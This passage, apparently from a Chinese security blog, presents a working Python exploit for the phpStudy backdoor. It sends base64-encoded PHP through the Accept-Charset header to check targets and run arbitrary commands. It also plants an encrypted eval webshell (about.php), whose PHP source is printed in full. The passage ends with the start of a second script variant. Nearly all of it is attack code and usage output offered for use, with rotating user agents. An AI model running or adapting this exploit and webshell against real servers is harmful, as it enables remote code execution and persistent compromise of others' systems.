.NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The Target Url'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w8'</span>,<span class="string">'--webshell_8'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2018'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w6'</span>,<span class="string">'--webshell_6'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2016'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(parse.print_help())</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &lt; <span class="number">4</span> <span class="keyword">and</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.check_Target()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_8:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2018()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_6:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2016()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>phpstudy 2018</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983146.36.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983187.58.png" alt=""></p>
+<p>phpstudy 2016</p>
+<blockquote>
+<p>唯一有变化的就是上传shell的时候，根路径和2018不一样,路径修改如下</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">'./WWW/about.php'</span>, <span class="string">'&lt;?php</span></span><br><span class="line"><span class="string">@error_reporting(0);</span></span><br><span class="line"><span class="string">session_start();</span></span><br><span class="line"><span class="string">if (isset($_GET["pass"]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=substr(md5(uniqid(rand())),16);</span></span><br><span class="line"><span class="string">    $_SESSION["k"]=$key;</span></span><br><span class="line"><span class="string">    print $key;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=$_SESSION["k"];</span></span><br><span class="line"><span class="string">	$post=file_get_contents("php://input");</span></span><br><span class="line"><span class="string">	if(!extension_loaded("openssl"))</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$t="base64_"."decode";</span></span><br><span class="line"><span class="string">		$post=$t($post."");</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span></span><br><span class="line"><span class="string">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span></span><br><span class="line"><span class="string">    			&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$post=openssl_decrypt($post, "AES128", $key);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">    $arr=explode("|",$post);</span></span><br><span class="line"><span class="string">    $func=$arr[0];</span></span><br><span class="line"><span class="string">    $params=$arr[1];</span></span><br><span class="line"><span class="string">	class C&#123;public function __construct($p) &#123;eval($p."");&#125;&#125;</span></span><br><span class="line"><span class="string">	@new C($params);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;'</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983388.91.png" alt=""></p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983409.4.png" alt=""></p>
+<h4 id="不带参数检测、利用、传shell"><a href="#不带参数检测、利用、传shell" class="headerlink" title="不带参数检测、利用、传shell"></a>不带参数检测、利用、传shell</h4><blockquote>
+<p>和带参数的效果一样，就不放图了，不同的是执行命令传shell时没有解析参数时被转义的问题了</p>
+</blockquote>
+<p>code</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span 